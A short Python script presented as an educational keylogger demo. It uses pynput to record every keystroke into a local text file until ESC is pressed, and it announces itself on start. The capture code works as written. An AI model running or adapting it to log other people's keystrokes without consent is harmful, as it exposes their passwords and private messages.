# keylogger_demo.py
# Author: Graywolf0
# 📌 Educational Project - For Portfolio Use Only
# ⚠️ WARNING: This script is for EDUCATIONAL and DEMO purposes only!

from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        # ESC'ye basınca loglama durur
        return False

print("🔐 Keylogger Demo Started (Press ESC to stop)...")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
